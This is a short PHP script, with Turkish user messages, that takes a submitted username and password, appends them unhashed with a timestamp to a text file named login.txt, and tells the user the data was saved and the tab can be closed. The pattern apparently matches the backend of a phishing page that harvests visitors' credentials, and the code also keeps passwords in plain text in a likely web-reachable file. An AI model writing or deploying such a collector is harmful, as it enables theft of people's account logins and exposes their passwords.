<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    if (empty($username) || empty($password)) {
        die("Hata: Kullanıcı adı veya şifre boş!");
    }

    // Kaydedilecek veri formatı
    $data = "Kullanıcı Adı: " . $username . " | Şifre: " . $password . " | Tarih: " . date("Y-m-d H:i:s") . "\n";

    // Verileri login.txt dosyasına kaydet
    if (file_put_contents("login.txt", $data, FILE_APPEND)) {
        echo "✅ Bilgiler başarıyla kaydedildi Sekmeyi Kapatabilirsiniz!";
    } else {
        echo "❌ Hata: Dosyaya yazılamadı!";
    }
}
?>
